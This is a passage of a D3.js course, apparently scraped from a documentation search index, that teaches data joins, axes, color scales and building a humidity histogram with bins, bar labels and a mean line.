<p>Let's add a function called <code>drawDots()</code> that mimics our dot drawing code. This function will select all existing circles, join them with a provided dataset, and draw any new circles with a provided color.</p> <pre><code>function drawDots(data, color) {\n  const dots = bounds.selectAll(\"circle\").data(dataset)\n\n  dots\n    .enter().append(\"circle\")\n    .attr(\"cx\", d =&gt; xScale(xAccessor(d)))\n    .attr(\"cy\", d =&gt; yScale(yAccessor(d)))\n    .attr(\"r\", 5)\n    .attr(\"fill\", color)\n}\n</code></pre> <p>Let's call this function with part of our dataset. The color doesn't matter much \u2014 let's go with a dark grey.</p> <pre><code>drawDots(data.slice(0, 200), \"darkgrey\")\n</code></pre> <p>We should see some of our dots drawn on the page.</p> <p>{width=50%} </p> <p>After one second, let's call the function again with our whole dataset, this time with a blue color. We're adding a timeout to help distinguish between the two sets of dots.</p> <pre><code>setTimeout(() =&gt; {\n  drawDots(data, \"cornflowerblue\")\n}, 1000)\n</code></pre> <p>When you refresh your webpage, you should see a set of grey dots, then a set of blue dots one second later.</p> <p>{width=50%} </p> <p>Each time we run <code>drawDots()</code>, we're setting the color of only new circles. This explains why the grey dots stay grey. If we wanted to set the color of all circles, we could re-select all circles and set their fill on the new selection:</p> <pre><code>function drawDots(data, color) {\n  const dots = bounds.selectAll(\"circle\").data(data)\n\n  dots.enter().append(\"circle\")\n  bounds.selectAll(\"circle\")\n      .attr(\"cx\", d =&gt; xScale(xAccessor(d)))\n      .attr(\"cy\", d =&gt; yScale(yAccessor(d)))\n      .attr(\"r\", 5)\n      .attr(\"fill\", color)\n}\n</code></pre> <p>In order to keep the chain going, d3 selection objects have a <code>merge()</code> method that will combine the current selection with another selection. In this case, we could combine the new <code>enter</code> selection with the original <code>dots</code> selection, which will return the full list of dots. When we set attributes on the new merged selection, we'll be updating all of the dots.</p> <pre><code>function drawDots(data, color) {\n  const dots = bounds.selectAll(\"circle\").data(data)\n\n  dots\n    .enter().append(\"circle\")\n    .merge(dots)\n      .attr(\"cx\", d =&gt; xScale(xAccessor(d)))\n      .attr(\"cy\", d =&gt; yScale(yAccessor(d)))\n      .attr(\"r\", 5)\n      .attr(\"fill\", color)\n}\n</code></pre>"},{"location":"datav/codes/code/course-full/module_01/lesson_01.06/draw-data/#join","title":"<code>.join()</code>","text":"<p>Since d3-selection version 1.4.0, there is a new <code>.join()</code> method that helps to cut down on this code. <code>.join()</code> is a shortcut for running <code>.enter()</code>, <code>.append()</code>, <code>.merge()</code>, and some other methods we haven't covered yet. This allows us to write the following code instead:</p> <pre><code>function drawDots(data, color) {\n  const dots = bounds.selectAll(\"circle\").data(data)\n\n  dots.join(\"circle\")\n    .attr(\"cx\", d =&gt; xScale(xAccessor(d)))\n    .attr(\"cy\", d =&gt; yScale(yAccessor(d)))\n    .attr(\"r\", 5)\n    .attr(\"fill\", color)\n}\n</code></pre> <p>While <code>.join()</code> is a great addition to d3, it's still beneficial to understand the <code>.enter()</code>, <code>.append()</code>, and <code>.merge()</code> methods. Most existing d3 code will use these methods, and it's important to understand the basics before getting fancy.</p> <p>Don't worry if this pattern still feels new \u2014 we'll reinforce and build on what we've learned when we talk about transitions. For now, let's delete this example code, uncomment our finished dots code, and move on with our scatter plot!</p>"},{"location":"datav/codes/code/course-full/module_01/lesson_01.06/draw-data/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_01/lesson_01.07/draw-peripherals/","title":"Draw peripherals","text":"<p>Let's finish up our chart by drawing our axes, starting with the x axis.</p> <p>We want our x axis to be:</p> <ul> <li>a line across the bottom</li> <li>with spaced \"tick\" marks that have...</li> <li>labels for values per tick</li> <li>a label for the axis overall</li> </ul> <p>To do this, we'll create our axis generator using <code>d3.axisBottom()</code>, then pass it:</p> <ul> <li>our x scale so it knows what ticks to make (from the domain) and</li> <li>what size to be (from the range).</li> </ul> <p>{lang=javascript,crop-query=.xAxisGenerator} &lt;&lt;code/02-making-a-scatterplot/completed/chart.js</p> <p>Next, we'll use our <code>xAxisGenerator()</code> and call it on a new g element. Remember, we need to translate the x axis to move it to the bottom of the chart bounds.</p> <p>{lang=javascript,crop-query=.xAxis} &lt;&lt;code/02-making-a-scatterplot/completed/chart.js</p> <p>When we render our webpage, we should see our scatter plot with an x axis. As a bonus, we can see how using <code>.nice()</code> on our scale ensures that our axis ends in round values.</p> <p>{width=50%} </p> <p>Let's expand on our knowledge and create labels for our axes. Drawing text in an SVG is fairly straightforward - we need a <code>&lt;text&gt;</code> element, which can be positioned with an <code>x</code> and a <code>y</code> attribute. We'll want to position it horizontally centered and slightly above the bottom of the chart.</p> <p><code>&lt;text&gt;</code> elements will display their children as text \u2014 we can set that with our selection's <code>.html()</code> method.</p> <p>{lang=javascript,crop-query=.xAxisLabel} &lt;&lt;code/02-making-a-scatterplot/completed/chart.js</p> <p>A&gt;We need to explicitly set the text fill to\u00a0black\u00a0because it inherits a fill value of\u00a0none\u00a0that d3 sets on the axis\u00a0<code>&lt;g&gt;</code> element.</p> <p>Great! Now we can see a label underneath our x axis.</p> <p>{width=50%} </p> <p>Almost there! Let's do the same thing with the y axis. First, we need an axis generator.</p> <p>D3 axes can be customized in many ways. An easy way to cut down on visual clutter is to tell our axis to aim for a certain number with the <code>ticks</code> method. Let's aim for 4 ticks, which should give the viewer enough information.</p> <p>{lang=javascript,crop-query=.yAxisGenerator} &lt;&lt;code/02-making-a-scatterplot/completed/chart.js</p> <p>A&gt;Note that the resulting axis won't necessarily have exactly 4 ticks. D3 will take the number as a suggestion and aim for that many ticks, but also trying to use friendly intervals. Check out some of the internal logic in the d3-array code \u2014 see how it's attempting to use intervals of <code>10</code>, then <code>5</code>, then <code>2</code>? A&gt; A&gt;There are many ways to configure the ticks for a d3 axis \u2014 find them all in the docs. For example, you can specify their exact values by passing an array of values to <code>.tickValues()</code>.</p> <p>Let's use our generator to draw our y axis.</p> <p>{lang=javascript,crop-query=.yAxis} &lt;&lt;code/02-making-a-scatterplot/completed/chart.js</p> <p>To finish up, let's draw the y axis label in the middle of the y axis, just inside the left side of the chart wrapper. d3 selection objects also have a <code>.text()</code> method that operates similarly to <code>.html()</code>. Let's try using that here.</p> <p>{lang=javascript,crop-query=context(.yAxisLabel, 0, -2)} &lt;&lt;code/02-making-a-scatterplot/completed/chart.js</p> <p>We'll need to rotate this label to fit next to the y axis. To rotate it around its center, we can set its CSS property <code>text-anchor</code> to <code>middle</code>.</p> <pre><code>.style(\"transform\", \"rotate(-90deg)\")\n.style(\"text-anchor\", \"middle\")\n</code></pre> <p>And just like that, we've drawn our scatter plot!</p> <p>{width=50%} </p>"},{"location":"datav/codes/code/course-full/module_01/lesson_01.07/draw-peripherals/#initialize-interactions","title":"Initialize interactions","text":"<p>The next step in our chart-drawing checklist is setting up interactions and event listeners. We'll go over this in detail in Module 5.</p>"},{"location":"datav/codes/code/course-full/module_01/lesson_01.07/draw-peripherals/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_01/lesson_01.08/looking-at-our-chart/","title":"Looking at our chart","text":"<p>Now that we've finished drawing our scatter plot, we can step back and see what we can learn from displaying the data in this manner. Without running statistical analyses (such as the Pearson Correlation Coefficient or Mutual Analyses), we won't be able to make any definitive statements about whether or not our metrics are correlated. However, we can still get a sense of how they relate to one another.</p> <p>Looking at the plotted dots, they do seem to group around an invisible line from the bottom left to the top right of the chart.</p> <p>{width=50%} </p> <p>Generally, it seems like we were correct in guessing that a high humidity would likely coincide with a high dew point.</p>"},{"location":"datav/codes/code/course-full/module_01/lesson_01.09/extra-credit-adding-a-color-scale/","title":"Extra credit: adding a color scale","text":"<p>Remember when I said that we could introduce another metric? Let's bring in the amount of cloud cover for each day. In our dataset, each datapoint records the cloud cover for that day. Let's show how the amount of cloud cover varies based on humidity and dew point by adding a color scale.</p> <p>{width=50%} </p> <p>Looking at a value in our dataset, we can see that the amount of cloud cover exists at the key <code>cloudCover</code>. Let's add another data accessor function near the top of our file:</p> <pre><code>const colorAccessor = d =&gt; d.cloudCover\n</code></pre> <p>Next up, let's create another scale at the bottom of our Create scales step.</p> <p>So far, we've only looked at linear scales that convert numbers to other numbers. Scales can also convert a number into a color \u2014 we just need to replace the domain with a range of colors.</p> <p>Let's make low cloud cover days be light blue and very cloudy days dark blue - that's a good semantic mapping.</p> <pre><code>const colorScale = d3.scaleLinear()\n    .domain(d3.extent(dataset, colorAccessor))\n    .range([\"skyblue\", \"darkslategrey\"])\n</code></pre> <p>Let's test it out - if we log <code>colorScale(0.1)</code> to the console, we should see a color value, such as <code>rgb(126, 193, 219)</code>. Perfect!</p> <p>A&gt;Choosing colors is a complicated topic! We'll learn about color spaces, good color scales, and picking colors in Chapter 7.</p> <p>All that's left to do is to update how we set the fill of each dot. Let's find where we're doing that now.</p> <pre><code>.attr(\"fill\", \"cornflowerblue\")\n</code></pre> <p>Instead of making every dot blue, let's use our <code>colorAccessor()</code> to grab the precipitation value, then pass that into our <code>colorScale()</code>.</p> <pre><code>.attr(\"fill\", d =&gt; colorScale(colorAccessor(d)))\n</code></pre> <p>When we refresh our webpage, we should see our finished scatter plot with dots of various blues.</p> <p>{width=50%} </p> <p>A&gt;For a complete, accessible chart, it would be a good idea to add a legend to explain what our colors mean. We'll skip this for now, to keep things simple.</p> <p>This chapter was jam-packed with new concepts \u2014 we learned about data joins, <code>&lt;text&gt;</code> SVG elements, color scales, and more. Give yourself a pat on the back for making it through! Next up, we'll create a bar chart and learn some new concepts.</p>"},{"location":"datav/codes/code/course-full/module_01/lesson_01.09/extra-credit-adding-a-color-scale/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_01/lesson_01.10/exercise-week-2/","title":"This week's exercise","text":"<p>Awesome work getting through our second week! During this week, make a totally new scatter plot! Here's our list of fun datasets, if you wanted to switch from last week.</p> <p>Choose a dataset to play with -- you'll want to pick one with multiple metrics that are numerical. Here are a few suggestions:</p> <ul> <li>compare the total number of colors Bob Ross used in his paintings to the number of unique colors</li> <li>compare the visibility of a lighthouse to its height or construction year</li> <li>compare the length of a penguin's bill to its depth. Extra credit: color each dot by the penguin's species</li> </ul> <p>Fork our scatter plot CodeSandbox, download the data, and import it into your new forked sandbox.</p> <p>A&gt; If the data is a csv file, you'll need to use <code>d3.csv()</code> instead of <code>d3.json()</code>.</p> <p>Now, go over the same steps we went through this week to make a scatter plot with this new data.</p> <p>If you get stuck, watch this week's videos again or post a question inline or on the Discord channel. Good luck! We're rooting for you!</p> <p>And once you're finished, show off your wonderful custom visualization on Twitter or on the Discord! We'd love to see it!</p>"},{"location":"datav/codes/code/course-full/module_02/lesson_02.00/making-a-bar-chart/","title":"Making a Bar Chart","text":"<p>We'll walk through one last \"basic\" chart \u2014 once finished, you'll feel very comfortable with each step and we'll move on to even more exciting concepts like animations and interactions.</p>"},{"location":"datav/codes/code/course-full/module_02/lesson_02.00/making-a-bar-chart/#deciding-the-chart-type","title":"Deciding the chart type","text":"<p>Another type of question that we can ask our dataset is: what does the distribution of a metric look like? For example:</p> <ul> <li>What kinds of humidity values do we have?</li> <li>Does the humidity level generally stay around one value, with a few very humid days and a few very dry days?</li> <li>Does it vary consistently, with no standard value?</li> <li>Or are there really humid days and really dry days, with none in-between?</li> </ul> <p>Looking at the scatter plot we just made, we can see the daily humidity values from the dots' vertical placement.</p> <p>{width=50%} </p> <p>But it's hard to answer our questions - do most of our dots fall close the middle of the chart? We're not entirely sure.</p> <p>Instead, let's make a histogram.</p>"},{"location":"datav/codes/code/course-full/module_02/lesson_02.00/making-a-bar-chart/#histogram","title":"Histogram","text":"<p>A histogram is a bar chart that shows the distribution of one metric, with the metric values on the x axis and the frequency of values on the y axis.</p> <p>{width=75%} </p> <p>In order to show the frequency, values are placed in equally-sized bins (visualized as individual bars). For example, we could make bins for dew point temperatures that span 10 degrees - these would look something like <code>[0-10, 10-20, 20-30, ...]</code>. A dew point of 15 degrees would be counted in the second bin: <code>10-20</code>.</p> <p>The number of and size of bins is up to the implementor - you could have a histogram with only 3 bins or one with 100 bins! There are standards that can be followed (feel free to check out d3's built-in formulas), but we can generally decide the number based on what suits the data and what's easy to read.</p> <p>Our goal is to make a histogram of humidity values. This will show us the distribution of humidity values and help answer our questions. Do most days stay around the same level of humidity? Or are there two types of days: humid and dry? Are there crazy humid days?</p> <p>{width=75%} </p> <p>T&gt; To interpret the above histogram, it shows that we have 48 days in our dataset with a humidity value between <code>0.55</code> and <code>0.6</code></p> <p>For extra credit, we'll generalize our histogram function and loop through eight metrics in our dataset - creating many histograms to compare!</p> <p></p> <p>Let's dig in.</p>"},{"location":"datav/codes/code/course-full/module_02/lesson_02.01/access-data/","title":"Chart checklist","text":"<p>To start, let's look over our chart-making checklist to remind ourselves of the necessary steps.</p> <ol> <li>Access data</li> <li>Create dimensions</li> <li>Draw canvas</li> <li>Create scales</li> <li>Draw data</li> <li>Draw peripherals</li> <li>Set up interactions</li> </ol> <p>We'll breeze through most of these steps, reinforcing what we've already learned.</p>"},{"location":"datav/codes/code/course-full/module_02/lesson_02.01/access-data/#access-data","title":"Access data","text":"<p>In our javascript file, let's grab the data from our JSON file, waiting until it's loaded to continue.</p> <p>{lang=javascript,crop-query=.dataset} &lt;&lt;code/03-making-a-bar-chart/completed/draw-bars.js</p> <p>This time, we're only interested in one metric for the whole chart. Remember, the y axis is plotting the frequency (i.e. the number of occurrences) of the metric whose values are on the x axis. So instead of an <code>xAccessor()</code> and <code>yAccessor()</code>, we define a single <code>metricAccessor()</code>.</p> <pre><code>const metricAccessor = d =&gt; d.humidity\n</code></pre>"},{"location":"datav/codes/code/course-full/module_02/lesson_02.01/access-data/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_02/lesson_02.02/create-dimensions/","title":"Create dimensions","text":"<p>Histograms are easiest to read when they are wider than they are tall. Let's set the width before defining the rest of our dimensions so we can use it to calculate the height. We'll also be able to quickly change the <code>width</code> later and keep the same aspect ratio for our chart.</p> <p>T&gt; Chart design tip: Histograms are easiest to read when they are wider than they are tall.</p> <p>Instead of filling the whole window, let's prepare for multiple histograms and keep our chart small. That way, the charts can stack horizontally and vertically, depending on the screen size.</p> <p>{lang=javascript,crop-query=.width} &lt;&lt;code/03-making-a-bar-chart/completed/draw-bars.js</p> <p>Alright! Let's use the <code>width</code> to set the <code>width</code> and <code>height</code> of our chart. We'll leave a larger margin on the top to account for the bar labels, which we'll position above each bar.</p> <p>{lang=javascript,crop-query=.dimensions} &lt;&lt;code/03-making-a-bar-chart/completed/draw-bars.js</p> <p>Remember, our wrapper encompasses the whole chart. If we subtract our margins, we'll get the size of our bounds which contain any data elements.</p> <p>{width=75%} </p> <p>Now that we know the size of our wrapper and margins, we can calculate the size of our bounds.</p> <p>{lang=javascript,crop-query=context(.dimensions.boundedWidth, 0, 6)} &lt;&lt;code/03-making-a-bar-chart/completed/draw-bars.js</p>"},{"location":"datav/codes/code/course-full/module_02/lesson_02.02/create-dimensions/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_02/lesson_02.03/draw-canvas/","title":"Draw canvas","text":"<p>Let's create our wrapper element. Try to write this code without looking first. Like we've done before, we want to select the existing element, add a new <code>&lt;svg&gt;</code> element, and set its width and height.</p> <p>{lang=javascript,crop-query=.wrapper} &lt;&lt;code/03-making-a-bar-chart/completed/draw-bars.js</p> <p>How far did you get without looking? Let's try that again for this next part: creating our bounds. As a reminder, our bounds are a <code>&lt;g&gt;</code> element that will contain our main chart bits and be shifted to respect our top and left margins.</p> <p>{lang=javascript,crop-query=.bounds} &lt;&lt;code/03-making-a-bar-chart/completed/draw-bars.js</p> <p>Perfect! Let's make our scales.</p>"},{"location":"datav/codes/code/course-full/module_02/lesson_02.03/draw-canvas/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_02/lesson_02.04/create-scales/","title":"Create scales","text":"<p>Our x scale should look familiar to the ones we've made in the past. We need a scale that will convert humidity levels into pixels-to-the-right. Since both the domain and the range are continuous numbers, we'll use our friend <code>d3.scaleLinear()</code>.</p> <p>Let's also use <code>.nice()</code>, which we learned in Module 2, to make sure our axis starts and ends on round numbers.</p> <p>{lang=javascript,crop-query=.xScale} &lt;&lt;code/03-making-a-bar-chart/completed/draw-bars.js</p> <p>Rad. Now we need to create our <code>yScale</code>.</p> <p>But wait a minute! We can't make a y scale without knowing the range of frequencies we need to cover. Let's create our data bins first.</p>"},{"location":"datav/codes/code/course-full/module_02/lesson_02.04/create-scales/#creating-bins","title":"Creating Bins","text":"<p>How can we split our data into bins, and what size should those bins be? We could do this manually by looking at the domain and organizing our days into groups, but that sounds tedious.</p> <p>Thankfully, we can use d3-array's <code>d3.bin()</code> method to create a bin generator. This generator will convert our dataset into an array of bins - we can even choose how many bins we want!</p> <p>Let's create a new generator:</p> <p>{lang=javascript,crop-query=context(.binsGenerator, 0, -3)} &lt;&lt;code/03-making-a-bar-chart/completed/draw-bars.js</p> <p>Similar to making a scale, we'll pass a domain to the generator to tell it the range of numbers we want to cover.</p> <p>{lang=javascript,crop-query=context(.binsGenerator, 0, -2)} &lt;&lt;code/03-making-a-bar-chart/completed/draw-bars.js</p> <p>Next, we'll need to tell our generator how to get the the humidity value, since our dataset contains objects instead of values. We can do this by passing our <code>metricAccessor()</code> function to the <code>.value()</code> method.</p> <p>{lang=javascript,crop-query=context(.binsGenerator, 0, -1)} &lt;&lt;code/03-making-a-bar-chart/completed/draw-bars.js</p> <p>We can also tell our generator that we want it to aim for a specific number of bins. When we create our bins, we won't necessarily get this exact amount, but it should be close.</p> <p>Let's aim for 13 bins \u2014 this should make sure we have enough granularity to see the shape of our distribution without too much noise. Keep in mind that the number of bins is the number of thresholds + 1.</p> <p>{lang=javascript,crop-query=.binsGenerator} &lt;&lt;code/03-making-a-bar-chart/completed/draw-bars.js</p> <p>Great! Our bin generator is ready to go. Let's create our bins by feeding it our data.</p> <p>{lang=javascript,crop-query=.bins} &lt;&lt;code/03-making-a-bar-chart/completed/draw-bars.js</p> <p>Let's take a look at these bins by logging them to the console: <code>console.log(bins)</code>.</p> <p></p> <p>Each bin is an array with the following structure:</p> <ul> <li>each item is a matching data point. For example, the first bin has no matching days \u2014 this is likely because we used <code>.nice()</code> to round out our x scale.</li> <li>there is an x0 key that shows the lower bound of included humidity values (inclusive)</li> <li>there is an x1 key that shows the upper bound of included humidity values (exclusive). For example, a bin with a x1 value of 1 will include values up to 1, but not 1 itself</li> </ul> <p>A&gt;Note how there are 15 bins in my example \u2014 our bin generator was aiming for 13 bins but decided that 15 bins were more appropriate. This was a good decision, creating bins with a sensible size of <code>0.05</code>. If our bin generator had been more strict about the number of bins, our bins would have ended up with a size of <code>0.06666667</code>, which is harder to reason about. To extract insights from a chart, readers will mentally convert awkward numbers into rounder numbers to make sense of them. Let's do that work for them.</p> <p>If we want, we can specify an exact number of bins by instead passing an array of thresholds. For example, we could specify 5 bins with <code>.thresholds([0, 0.2, 0.4, 0.6, 0.8, 1]</code>).</p>"},{"location":"datav/codes/code/course-full/module_02/lesson_02.04/create-scales/#creating-the-y-scale","title":"Creating the y scale","text":"<p>Okay great, now we can use these bins to create our y scale. First, let's create a y accessor function and throw it at the top of our file. Now that we know the shape of the data that we'll use to create our data elements, we can specify how to access the y value in one place.</p> <p>{lang=javascript,crop-query=.yAccessor} &lt;&lt;code/03-making-a-bar-chart/completed/draw-bars.js</p> <p>Let's use our new accessor function and our bins to create that y scale. As usual, we'll want to make a linear scale. This time, however, we'll want to start our y axis at zero.</p> <p>Previously, we wanted to represent the extent of our data since we were plotting metrics that had no logical bounds (temperature and humidity level). But the number of days that fall in a bin is bounded at 0 \u2014 you can't have negative days in a bin!</p> <p>Instead of using <code>d3.extent()</code>, we can use another method from d3-array: <code>d3.max()</code>. This might sound familiar \u2014 we've used its counterpart, <code>d3.min()</code> in Module 2. <code>d3.max()</code> takes the same arguments: an array and an accessor function.</p> <p>Note that we're passing <code>d3.max()</code> our <code>bins</code> instead of our original <code>dataset</code> \u2014 we want to find the maximum number of days in a bin, which is only available in our computed <code>bins</code> array.</p> <p>{lang=javascript,crop-query=context(.yScale, 0, -1)} &lt;&lt;code/03-making-a-bar-chart/completed/draw-bars.js</p> <p>Let's use <code>.nice()</code> here as well to give our bars a round top number.</p> <p>{lang=javascript,crop-query=.yScale} &lt;&lt;code/03-making-a-bar-chart/completed/draw-bars.js</p>"},{"location":"datav/codes/code/course-full/module_02/lesson_02.04/create-scales/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_02/lesson_02.05/draw-data/","title":"Draw data","text":"<p>Here comes the fun part! Our plan is to create one bar for each bin, with a label on top of each bar.</p> <p>We'll need one bar for each item in our <code>bins</code> array \u2014 this is a sign that we'll want to use the data bind concept we learned in Module 2.</p> <p>Let's first create a <code>&lt;g&gt;</code> element to contain our bins. This will help keep our code organized and isolate our bars in the DOM.</p> <p>{lang=javascript,crop-query=.binsGroup} &lt;&lt;code/03-making-a-bar-chart/completed/draw-bars.js</p> <p>Because we have more than one element, we'll bind each data point to a <code>&lt;g&gt;</code> SVG element. This will let us group each bin's bar and label.</p> <p>To start, we'll select all existing <code>&lt;g&gt;</code> elements within our <code>binsGroup</code> (there aren't any yet, but we're creating a selection object that points to the right place). Then we'll use <code>.data()</code> to bind our <code>bins</code> to the selection.</p> <p>{lang=javascript,crop-query=context(.binGroups, 0, -1)} &lt;&lt;code/03-making-a-bar-chart/completed/draw-bars.js</p> <p>Next, we'll create our <code>&lt;g&gt;</code> elements, using <code>.join()</code> to target all of our bins.</p> <p>{lang=javascript,crop-query=.binGroups} &lt;&lt;code/03-making-a-bar-chart/completed/draw-bars.js</p> <p>The above code will create one new <code>&lt;g&gt;</code> element for each bin. We're going to place our bars within this group.</p> <p>Next up we'll draw our bars, but first we should calculate any constants that we'll need. Like a warrior going into battle, we want to prepare our weapons before things heat up.</p> <p>In this case, the only constant that we can set ahead of time is the padding between bars. Giving them some space helps distinguish individual bars, but we don't want them too far apart - that will make them hard to compare and take away from the overall shape of the distribution.</p> <p>T&gt; Chart design tip: putting a space between bars helps distinguish individual bars</p> <p>{lang=javascript,crop-query=.barPadding} &lt;&lt;code/03-making-a-bar-chart/completed/draw-bars.js</p> <p>Now we are armed warriors and are ready to charge into battle! Each bar is a rectangle, so we'll append a <code>&lt;rect&gt;</code> to each of our <code>&lt;g&gt;</code> elements.</p> <p>{lang=javascript,crop-query=context(.barRects, 0, -8)} &lt;&lt;code/03-making-a-bar-chart/completed/draw-bars.js</p> <p>Remember, <code>&lt;rect&gt;</code>s need four attributes: x, y, width, and height.</p> <p>Let's start with the x value, which will corresponds to the left side of the bar. The bar will start at the lower bound of the bin, which we can find at the x0 key.</p> <p>But x0 is a humidity level, not a pixel. So let's use <code>xScale()</code> to convert it to pixel space.</p> <p>Lastly, we need to offset it by the <code>barPadding</code> we set earlier.</p> <p>{lang=javascript,crop-query=context(.barRects, -1, -7)} &lt;&lt;code/03-making-a-bar-chart/completed/draw-bars.js</p> <p>A&gt;We could create accessor functions for the x0 and x1 properties of each bin if we were concerned about the structure of our bins changing. In this case, it would be overkill since: A&gt; A&gt;1. we didn't specify the structure of each bin, <code>d3.bin()</code> did A&gt;2. we're not going to change the way we access either of these values since they're built in to <code>d3.bin()</code> A&gt;3. the way we access these properties is very straightforward. If the values were more nested or required computation, we could definitely benefit from accessor functions.</p> <p>Next, we'll specify the <code>&lt;rect&gt;</code>'s y attribute which corresponds to the top of the bar. We'll use our <code>yAccessor()</code> to grab the frequency and use our scale to convert it into pixel space.</p> <p>{lang=javascript,crop-query=context(.barRects, -2, -6)} &lt;&lt;code/03-making-a-bar-chart/completed/draw-bars.js</p> <p>To find the width of a bar, we need to subtract the x0 position of the left side of the bar from the x1 position of the right side of the bar.</p> <p>We'll need to subtract the bar padding from the total width to account for spaces between bars. Sometimes we'll get a bar with a <code>width</code> of <code>0</code>, and subtracting the <code>barPadding</code> will bring us to <code>-1</code>. To prevent passing our <code>&lt;rect&gt;</code>s a negative <code>width</code>, we'll wrap our value with <code>d3.max([0, width])</code>.</p> <p>{lang=javascript,crop-query=context(.barRects, -3, -2)} &lt;&lt;code/03-making-a-bar-chart/completed/draw-bars.js</p> <p>Lastly, we'll calculate the bar's height by subtracting the y value from the bottom of the y axis. Since our y axis starts from 0, we can use our <code>boundedHeight</code>.</p> <p>{lang=javascript,crop-query=context(.barRects, -7, -1)} &lt;&lt;code/03-making-a-bar-chart/completed/draw-bars.js</p> <p>Let's put that all together and change the bar fill to blue.</p> <p>{lang=javascript,crop-query=.barRects} &lt;&lt;code/03-making-a-bar-chart/completed/draw-bars.js</p> <p>Alright! Now we're starting to see the beginnings of our histogram!</p> <p>{width=75%} </p>"},{"location":"datav/codes/code/course-full/module_02/lesson_02.05/draw-data/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_02/lesson_02.06/adding-labels/","title":"Adding Labels","text":"<p>Let's add labels to show the count for each of these bars.</p> <p>We can keep our chart clean by only adding labels to bins with any relevant days \u2014 having <code>0</code>s in empty spaces is unhelpful visual clutter. We can identify which bins have no data by their lack of a bar, no need to call it out with a label.</p> <p>d3 selections have a <code>.filter()</code> method that acts the same way the native Array method does. <code>.filter()</code> accepts one parameter: a function that accepts one data point and returns a value. Any items in our dataset who return a falsey value will be removed.</p> <p>A&gt;By \"falsey\", we're referring to any value that evaluates to <code>false</code>. Maybe surprisingly, this includes values other than <code>false</code>, such as <code>0</code>, <code>null</code>, <code>undefined</code>, <code>\"\"</code>, and <code>NaN</code>. Keep in mind that empty arrays <code>[]</code> and object <code>{}</code> evaluate to truthy. If you're curious, read more here.</p> <p>We can use <code>yAccessor()</code> as shorthand for <code>d =&gt; yAccessor(d) != 0</code> because <code>0</code> is falsey.</p> <p>{lang=javascript,crop-query=context(.barText, 0, -8)} &lt;&lt;code/03-making-a-bar-chart/completed/draw-bars.js</p> <p>Since these labels are just text, we'll want to use the SVG <code>&lt;text&gt;</code> element we've been using for our axis labels.</p> <p>{lang=javascript,crop-query=context(.barText, 0, -7)} &lt;&lt;code/03-making-a-bar-chart/completed/draw-bars.js</p> <p>Remember, <code>&lt;text&gt;</code> elements are positioned with x and y attributes. The label will be centered horizontally above the bar \u2014 we can find the center of the bar by adding half of the bar's width (the right side minus the left side) to the left side of the bar.</p> <p>{lang=javascript,crop-query=context(.barText, 0, -6)} &lt;&lt;code/03-making-a-bar-chart/completed/draw-bars.js</p> <p>Our <code>&lt;text&gt;</code>'s y position will be similar to the <code>&lt;rect&gt;</code>'s y position, but let's shift it up by 5 pixels to add a little gap.</p> <p>{lang=javascript,crop-query=context(.barText, 0, -5)} &lt;&lt;code/03-making-a-bar-chart/completed/draw-bars.js</p> <p>Next, we'll display the count of days in the bin using our <code>yAccessor()</code> function. Note: again, we can use <code>yAccessor()</code> as shorthand for <code>d =&gt; yAccessor(d)</code>.</p> <p>{lang=javascript,crop-query=context(.barText, 0, -4)} &lt;&lt;code/03-making-a-bar-chart/completed/draw-bars.js</p> <p>We can use the CSS <code>text-anchor</code> property to horizontally align our text \u2014 this is a much simpler solution than compensating for text width when we set the x attribute.</p> <p>{lang=javascript,crop-query=context(.barText, 0, -3)} &lt;&lt;code/03-making-a-bar-chart/completed/draw-bars.js</p> <p>After adding a few styles to decrease the visual importance of our labels...</p> <p>{lang=javascript,crop-query=.barText} &lt;&lt;code/03-making-a-bar-chart/completed/draw-bars.js</p> <p>...we should see the count of days for each of our bars!</p> <p>{width=75%} </p>"},{"location":"datav/codes/code/course-full/module_02/lesson_02.06/adding-labels/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_02/lesson_02.07/draw-peripherals/","title":"Draw peripherals","text":"<p>When looking at the shape of a distribution, it can be helpful to know where the mean is.</p> <p>The mean is just the average \u2014 the center of a set of numbers. To calculate the mean, you would divide the sum by the number of values. For example, the mean of <code>[1, 2, 3, 4, 5]</code> would be <code>(1 + 2 + 3 + 4 + 5) / 5 = 3</code>.</p> <p>Instead of calculating the mean by hand, we can use <code>d3.mean()</code> to grab that value. Like many d3 methods we've used, we pass the dataset as the first parameter and an optional accessor function as the second.</p> <p>{lang=javascript,crop-query=.mean} &lt;&lt;code/03-making-a-bar-chart/completed/draw-bars.js</p> <p>Great! Let's see how comfortable we are with drawing an unfamiliar SVG element: <code>&lt;line&gt;</code>. A <code>&lt;line&gt;</code> element will draw a line between two points: <code>[x1, y1]</code> and <code>[x2, y2]</code>.  Using this knowledge, let's add a line to our bounds that is:</p> <ul> <li>at the mean humidity level,</li> <li>starting 15px above our chart, and</li> <li>ending at our x axis.</li> </ul> <p>How close can you get before looking at the following code?</p> <p>{lang=javascript,crop-query=context(.meanLine, 0, -2)} &lt;&lt;code/03-making-a-bar-chart/completed/draw-bars.js</p> <p>Let's add some styles to the line so we can see it (by default, <code>&lt;line&gt;</code>s have no stroke color) and to distinguish it from an axis. SVG element strokes can be split into dashes with the <code>stroke-dasharray</code> attribute. The lines alternate between the stroke color and transparent, starting with transparent. We define the line lengths with a space-separated list of values (which will be repeated until the line is drawn).</p> <p>Let's make our lines dashed with a 2px long maroon dash and a 4px long gap.</p> <p>{lang=javascript,crop-query=.meanLine} &lt;&lt;code/03-making-a-bar-chart/completed/draw-bars.js</p> <p>Give yourself a pat on the back for drawing your first <code>&lt;line&gt;</code> element!</p> <p>{width=75%} </p> <p>Let's label our line to clarify to readers what it represents. We'll want to add a <code>&lt;text&gt;</code> element in the same position as our line, but 5 pixels higher to give a little gap.</p> <p>{lang=javascript,crop-query=context(.meanLabel, 0, -1)} 